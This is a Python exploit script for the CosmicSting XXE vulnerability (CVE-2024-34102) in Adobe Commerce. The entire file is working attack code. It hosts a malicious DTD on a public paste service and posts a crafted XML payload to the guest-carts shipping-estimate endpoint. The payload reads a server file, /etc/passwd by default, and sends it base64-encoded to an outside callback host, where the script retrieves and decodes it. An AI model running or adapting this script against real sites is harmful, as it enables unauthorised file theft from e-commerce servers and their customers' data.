#!/usr/bin/env python

import re
import json
import uuid
import base64
import requests
from time import sleep
import rich_click as click
from fake_useragent import UserAgent

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)


class CosmicSting:

    def __init__(self, url: str, file: str):
        self.url = url
        self.file = file
        self.dtd_url = None

    def print_message(self, message: str, header: str) -> None:
        """
        Print a formatted message with a colored header.
        """
        header_colors = {"+": "green", "-": "red", "!": "yellow", "*": "blue"}
        header_color = header_colors.get(header, "white")
        formatted_message = click.style(
            f"[{header}] ", fg=header_color, bold=True
        ) + click.style(f"{message}", bold=True, fg="white")
        click.echo(formatted_message)

    def create_callback_url(self) -> None:
        """
        Create a callback URL using an online tool to host a malicious DTD file.
        """
        dtd_data = f"""<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource={self.file}">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'https://{self.instance_id}.c5.rs/?exploited=%data;'>">
"""
        url = "https://fars.ee/"
        random_filename = str(uuid.uuid4())

        response = requests.post(
            url, files={"c": (random_filename, dtd_data)}, verify=False
        )
        match = re.search(rf"{url}(?P<uuid>[a-zA-Z0-9\-]+)", response.text)
        if not match:
            raise Exception("Failed to extract the UUID using regex.")
        uuid_value = match.group("uuid")

        self.dtd_url = f"{url}{uuid_value}.dtd"
        self.print_message(f"Created Callback URL: {self.dtd_url}", "+")
        self.print_message(f"File to be read: {self.file}", "+")

    def obtain_instance(self) -> str:
        """
        Obtain an instance ID from the SSRF API.
        """
        base_url = "https://api.cvssadvisor.com/ssrf/api/instance"
        headers = {"User-Agent": UserAgent().random}

        response = requests.post(base_url, headers=headers, verify=False)
        responsed = response.text.strip('"')
        return responsed

    def check_instance_log(self, instance_id: str, url: str) -> bool:
        """
        Check the instance log for exploitation success.
        """
        base_url = f"https://api.cvssadvisor.com/ssrf/api/instance/{instance_id}"
        headers = {"User-Agent": UserAgent().random}

        response = requests.get(base_url, headers=headers, verify=False)
        data = response.json()
        raw_data = json.dumps(data)

        if "/?exploited=" in raw_data:
            exploited_data = re.search(r"exploited=(.*) HTTP", raw_data).group(1)
            decoded_data = base64.b64decode(exploited_data).decode("utf-8")
            self.print_message(f"Decoded Exploited Data: \n{decoded_data}", "+")
            return True
        else:
            return False

    def clear_instance(self, instance_id: str) -> None:
        """
        Clear the instance logs on the SSRF API.
        """
        base_url = f"https://api.cvssadvisor.com/ssrf/api/instance/{instance_id}/clear"
        headers = {"User-Agent": UserAgent().random}

        requests.delete(base_url, headers=headers, verify=False)

    def remove_instance(self, instance_id: str) -> None:
        """
        Remove the instance on the SSRF API.
        """
        base_url = f"https://api.cvssadvisor.com/ssrf/api/instance/{instance_id}"
        headers = {"User-Agent": UserAgent().random}

        requests.delete(base_url, headers=headers, verify=False)

    def send_request(self, url: str) -> None:
        """
        Send a malicious request to the target URL.
        """
        base_url = f"{url}/rest/V1/guest-carts/1/estimate-shipping-methods"
        header = {"User-Agent": UserAgent().random}

        body = {
            "address": {
                "totalsCollector": {
                    "collectorList": {
                        "totalCollector": {
                            "sourceData": {
                                "data": f'<?xml version="1.0" ?> <!DOCTYPE r [ <!ELEMENT r ANY > <!ENTITY % sp SYSTEM "{self.dtd_url}"> %sp; %param1; ]> <r>&exfil;</r>',
                                "options": 12345678,
                            }
                        }
                    }
                }
            }
        }

        requests.post(base_url, json=body, headers=header, verify=False)

    def execute_exploit(self, url: str) -> None:
        """
        Execute the exploitation process.
        """
        self.send_request(url)

        is_exploited = self.check_instance_log(self.instance_id, url)

        if is_exploited:
            self.print_message(f"Vulnerable URL: {url}", "+")
        else:
            self.print_message(f"Not Vulnerable URL: {url}", "-")

        self.clear_instance(self.instance_id)

    def run(self) -> None:
        """
        Run the exploitation process.
        """
        self.instance_id = self.obtain_instance()
        if not self.instance_id:
            self.print_message(
                "Unable to create a interactive SSRF server. Please run again!", "-"
            )
            exit()
        try:
            self.create_callback_url()
        except:
            sleep(5)
            self.create_callback_url()
        self.execute_exploit(self.url)
        self.remove_instance(self.instance_id)


@click.command(
    help="""
CosmicSting (CVE-2024-34102): Adobe Commerce versions 2.4.7, 2.4.6-p5, 2.4.5-p7, 2.4.4-p8, and earlier are affected by
an Improper Restriction of XML External Entity Reference ('XXE') vulnerability that could result in arbitrary code execution.
An attacker could exploit this vulnerability by sending a crafted XML document that references external entities.
Exploitation of this issue does not require user interaction.

Credits to @th3gokul & Sanjaith3hacker for the original code base.
"""
)
@click.option(
    "-u",
    "--url",
    required=True,
    help="Specify a URL or domain for vulnerability detection",
)
@click.option(
    "-f",
    "--file",
    default="/etc/passwd",
    help="Specify the file to read from the server",
)
def main(url: str, file: str) -> None:
    cve_exploit = CosmicSting(url, file)
    cve_exploit.run()


if __name__ == "__main__":
    main()
